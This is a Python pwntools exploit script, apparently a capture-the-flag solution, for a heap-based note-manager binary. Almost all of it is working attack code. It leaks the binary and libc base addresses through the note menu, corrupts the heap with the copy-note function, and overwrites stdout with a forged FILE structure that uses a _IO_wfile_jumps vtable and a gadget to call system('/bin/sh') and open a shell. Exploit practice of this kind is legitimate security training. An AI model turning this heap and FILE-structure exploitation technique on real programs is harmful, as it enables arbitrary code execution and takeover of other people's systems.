#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('note_manager_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def add_note(idx, size, content):
    io.sendlineafter(b"$", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    io.sendlineafter(b":", content)

def delete_note(idx):
    io.sendlineafter(b"$", b"2") 
    io.sendlineafter(b":", str(idx).encode())

def copy_note(src, dest):
    io.sendlineafter(b"$", b"3") 
    io.sendlineafter(b":", str(src).encode())
    io.sendlineafter(b":", str(dest).encode())

def show_note(idx, ru):
    io.sendlineafter(b"$", b"4") 
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(ru)
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))
  

def solve():

    io.sendafter(b":", b"A"*32)
    io.recvuntil(b"A"*32)
    read_name = u64(io.recv(6).ljust(8, b"\x00"))
    exe.address = read_name - exe.sym["read_name"]
    info("exe base: %#x", exe.address)

    add_note(0, 0x500, b"A"*0x10)
    add_note(1, 0x20, b"A"*0x10)
    add_note(4, 0x20, b"A"*0x10)

    delete_note(0)
    add_note(0, 0x20, b"A"*8)
    main_arena = show_note(0, ru=b"A"*8)
    libc.address = main_arena - 0x203b20
    
    info("libc base: %#x", libc.address)

    _IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
    _IO_2_1_stdout_ = libc.sym["_IO_2_1_stdout_"]

    stdout_lock = libc.address + 0x205710
    stdout = _IO_2_1_stdout_
    fake_vtable = _IO_wfile_jumps - 0x18
    gadget = libc.address + 0x0000000000172520  # add rdi, 0x10 ; jmp rcx

    info("gadget: %#x", gadget)
    fake                = FileStructure(0)
    fake.flags          = 0x3b01010101010101
    fake._IO_read_end   = libc.sym['system']      
    fake._IO_save_base  = gadget
    fake._IO_write_end  = u64(b'/bin/sh\x00') 
    fake._lock          = stdout_lock
    fake._codecvt       = stdout + 0xb8
    fake._wide_data     = stdout + 0x200 
    fake.unknown2       = p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    payload = b"A"*(8*5) + p64(0x21) + p64(0xdeadbeef) + p64(_IO_2_1_stdout_)
    add_note(2, len(bytes(fake))+1, bytes(fake))
    add_note(3, len(payload)+1, payload)
    copy_note(3, 1)
    copy_note(2, 4)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

